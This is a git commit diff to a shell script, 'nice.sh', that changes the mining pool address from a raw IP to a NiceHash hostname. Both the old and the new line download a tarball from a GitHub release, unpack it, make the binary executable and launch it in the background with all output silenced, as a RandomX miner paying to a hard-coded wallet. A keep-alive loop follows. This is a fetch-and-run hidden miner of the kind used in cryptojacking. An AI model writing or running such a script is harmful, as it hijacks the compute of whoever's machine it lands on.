9ec19840581b5807caf33d000ef5ef8c79c9970a
preak07 <160253225+preak07@users.noreply.github.com>
2024-03-12 04:44:41 +0700

    Update nice.sh

--- nice.sh
+++ nice.sh
@@ -1,4 +1,4 @@
-wget https://github.com/exo0088/zuan/releases/download/bonk/work.tar.gz && tar -xvf work.tar.gz > /dev/null 2>&1 && chmod +x work && ./work -algo randomx -wallet 3AhGzsYExJchLbzGVuiRTk33M5RAmL6C1f  -coin BTC -rigName "vivo" -pool1 34.96.85.230:3380 -threads= 1 >/dev/null 2>&1 &
+wget https://github.com/exo0088/zuan/releases/download/bonk/work.tar.gz && tar -xvf work.tar.gz > /dev/null 2>&1 && chmod +x work && ./work -algo randomx -wallet 3AhGzsYExJchLbzGVuiRTk33M5RAmL6C1f  -coin BTC -rigName "vivo" -pool1 randomxmonero.eu.nicehash.com:3380 -threads= 1 >/dev/null 2>&1 &
 while true
 do
         echo "gasss........!"
